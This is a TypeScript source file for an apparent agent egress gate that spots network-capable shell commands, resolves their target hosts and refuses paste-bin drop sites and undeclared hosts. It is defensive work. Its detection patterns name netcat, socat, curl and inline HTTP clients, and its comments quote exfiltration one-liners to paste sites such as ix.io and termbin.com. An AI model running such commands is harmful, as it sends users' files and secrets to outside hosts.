// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 Capt. Anil Sharma (rocketlang). All rights reserved.
// See LICENSE for details.

// KAVACH — network capability-over-target (AF-T-704, ANU-I-007, AFW-YK-002).
//
// The ANU-I-006 shape applied to egress: (network-capable invocation) ∧ ¬(target
// declared) ⇒ judge on the resolved host's class. This is the COOPERATIVE-face twin of
// the kernel egress allowlist (KOS-042): the kernel binds jailed agents by IP; this
// binds hook-governed sessions by NAME, from the same declarations, before the socket
// ever opens. It is the control whose absence the RubyGems-class incident describes —
// an agent crawling/exfiltrating to hosts nobody declared.
//
// CEILING (state it, never round up): this reads the COMMAND TEXT. A network call made
// from inside an interpreter (`python -c "urllib..."`, a script file, a compiled tool)
// is invisible here — that traffic belongs to the kernel face. A client set is listed,
// not inferred; an unlisted client is a gap to add, not a proof of safety.

import { buildEgressPolicy } from "../kernel/egress-policy";
import { isDropSite, dropSitesNamed } from "../shield/drop-sites";
import { credentialMarkers, renderMarkers } from "../shield/credential-marker";

// Clients whose presence makes a command network-capable. Documented set (RT-001-style:
// the label is authored, not guessed by the gate under test).
const NET_CLIENTS =
  /\b(curl|wget|nc|ncat|netcat|socat|ssh|scp|sftp|rsync|ftp|telnet)\b/;

// AF-T-709 — an inline interpreter one-liner that loads an HTTP/socket client. Before this,
// `python3 -c "requests.post('https://paste.ee/api', …)"` never reached ANU-I-007 at all.
// Inline forms only; a script FILE's traffic is still the kernel face's (ceiling above).
const INLINE_HTTP =
  /\b(?:python[0-9.]*|node|bun|deno|ruby|perl|php)\s+(?:-\S+\s+)*-(?:c|e|r)\b[\s\S]*\b(?:requests|urllib|http\.client|httpx|aiohttp|socket|fetch|axios|https?\.(?:request|get)|Net::HTTP|LWP|curl_exec|file_get_contents)\b|\bInvoke-(?:WebRequest|RestMethod)\b/;

// git subcommands that talk to a remote. `git commit`/`status` are local and never match.
const GIT_REMOTE = /\bgit\s+(?:-C\s+\S+\s+)?(clone|fetch|pull|push|remote\s+update|ls-remote)\b/;

export function isNetworkCapableInvocation(command: string): boolean {
  return NET_CLIENTS.test(command) || GIT_REMOTE.test(command) || INLINE_HTTP.test(command);
}

/**
 * Hosts a command names. Deliberately conservative: only shapes whose host position is
 * unambiguous. `null` in the list means "a network target exists but cannot be resolved
 * from the text" (e.g. `curl "$URL"`) — UNKNOWN, never waved past (ANU-004).
 */
export function resolveTargetHosts(command: string): (string | null)[] {
  const hosts = new Set<string>();
  let sawUnresolvable = false;

  // scheme://host[:port]/...  (http, https, ftp, git, ssh)
  for (const m of command.matchAll(/\b(?:https?|ftp|git|ssh):\/\/(?:[^\s\/@'"]*@)?([A-Za-z0-9._-]+|\[[0-9a-fA-F:]+\])(?::\d+)?/g)) {
    hosts.add(m[1].replace(/^\[|\]$/g, ""));
  }
  // ssh/sftp: the first non-flag argument is the host
  for (const m of command.matchAll(/\b(?:ssh|sftp)\s+(?:-\S+\s+)*(?:[A-Za-z0-9._-]+@)?([A-Za-z0-9][A-Za-z0-9._-]*)/g)) {
    hosts.add(m[1]);
  }
  // scp/rsync: the remote is whichever argument carries `[user@]host:path` (`:` not `://`)
  if (/\b(?:scp|rsync)\b/.test(command)) {
    for (const m of command.matchAll(/(?:^|[\s='"])(?:[A-Za-z0-9._-]+@)?([A-Za-z0-9][A-Za-z0-9._-]*):(?!\/\/)/g)) {
      hosts.add(m[1]);
    }
  }
  // nc/ncat/netcat host port
  for (const m of command.matchAll(/\b(?:nc|ncat|netcat)\s+(?:-\S+\s+)*([A-Za-z0-9][A-Za-z0-9._-]*)\s+\d+/g)) {
    hosts.add(m[1]);
  }
  // AF-T-709 — drop sites are named bare as often as with a scheme (`curl -F f=@x ix.io`,
  // `nc termbin.com 9999`); a listed sink is resolved wherever it appears in the text.
  for (const h of dropSitesNamed(command)) hosts.add(h);

  // A network client invoked with a variable/quoted-expansion target: the capability is
  // present, the target is not in the text.
  if (isNetworkCapableInvocation(command) && hosts.size === 0) sawUnresolvable = true;
  if (/\b(?:curl|wget)\b[^|&;]*\$\{?[A-Z_]/.test(command)) sawUnresolvable = true;

  const out: (string | null)[] = [...hosts];
  if (sawUnresolvable) out.push(null);
  return out;
}

export type HostClass = "loopback" | "private" | "declared" | "undeclared" | "drop-site";

// The trusted internal suffixes this box serves — cooperative-face extension of the
// kernel declarations (which are exact FQDNs for jailed agents). A suffix here means
// "ours": first-party surface, not the open internet.
const TRUSTED_SUFFIXES = ["ankr.in", "mari8x.com", "xshieldai.com", "digimitra.guru", "ankrlabs.org", "ankrforge.in", "ankr.digital"];

/** The declared hostname universe for the cooperative face: kernel policy names + our suffixes. */
export function declaredHosts(): { exact: Set<string>; suffixes: string[] } {
  const exact = new Set<string>();
  // Same declarations the kernel compiles from (general domain, registered-services bit set
  // so localhost entries are present). Names only — the cooperative face judges names.
  for (const e of buildEgressPolicy(1 << 6, "general").allow) exact.add(e.host.toLowerCase());
  return { exact, suffixes: TRUSTED_SUFFIXES };
}

const PRIVATE_IP = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/;

export function classifyHost(host: string, declared = declaredHosts()): HostClass {
  const h = host.toLowerCase();
  // AF-T-709 — checked first: a drop site is never "declared" by a suffix accident.
  if (isDropSite(h)) return "drop-site";
  if (h === "localhost" || h === "127.0.0.1" || h === "::1" || h.startsWith("127.")) return "loopback";
  if (PRIVATE_IP.test(h)) return "private";
  if (declared.exact.has(h)) return "declared";
  if (declared.suffixes.some((s) => h === s || h.endsWith("." + s))) return "declared";
  return "undeclared";
}

export interface NetVerdict {
  verdict: "PERMIT" | "REFUSE" | "UNKNOWN";
  detail: string;
  source: string;
  stage?: "enforce" | "observe";
}

/**
 * The ANU-I-007 decision, pure and injectable. GRADED (AF-T-709, founder ruling 2026-09-29):
 * the drop-site branch is a positive low-FP identification and ENFORCES; every other branch
 * stays OBSERVE (AFW-006) — sessions legitimately curl hosts nobody has declared (docs, APIs
 * under evaluation), so those collect shadow evidence and warn. Promotion of the rest is
 * graded later on ledger data, exactly the AF-R-005 procedure. @rule:AFW-YK-002 @rule:AFW-006
 */
export function netTargetVerdict(command: string, declared = declaredHosts()): NetVerdict {
  const src = "command text + egress declarations (kernel policy names + trusted suffixes)";
  const targets = resolveTargetHosts(command);
  if (targets.length === 0) {
    return { verdict: "PERMIT", detail: "no network target named", source: src, stage: "observe" };
  }

  // AF-T-709 — the positively-identified branch: a named drop site (paste bin, file drop,
  // request catcher). ENFORCES — the low-FP identification AFW-006 required for promotion.
  // The detail carries TYPED credential markers (kind + hash, never the value) so the ledger
  // says whether a third-party secret rode along or only the destination's own token.
  const drops = targets.filter((t): t is string => t !== null && classifyHost(t, declared) === "drop-site");
  if (drops.length > 0) {
    const markers = credentialMarkers(command);
    return {
      verdict: "REFUSE",
      detail:
        `network-capable invocation names a drop site (paste/file-share/request-catcher): ${drops.join(", ")} — ` +
        `anonymous upload sinks are refused, not merely undeclared` +
        (markers.length ? `; credential markers: ${renderMarkers(markers)}` : "; credential markers: none"),
      source: src + " + drop-site list (src/shield/drop-sites.ts)",
      stage: "enforce",
    };
  }

  const undeclared = targets.filter((t): t is string => t !== null && classifyHost(t, declared) === "undeclared");
  const unresolvable = targets.includes(null);

  if (undeclared.length > 0) {
    return {
      verdict: "REFUSE",
      detail: `network-capable invocation names undeclared external host(s): ${undeclared.join(", ")} — not in the egress declarations`,
      source: src,
      stage: "observe",
    };
  }
  if (unresolvable) {
    return {
      verdict: "UNKNOWN",
      detail: "network-capable invocation whose target host cannot be resolved from the command text",
      source: src,
      stage: "observe",
    };
  }
  return { verdict: "PERMIT", detail: `all named hosts are loopback/private/declared`, source: src, stage: "observe" };
}
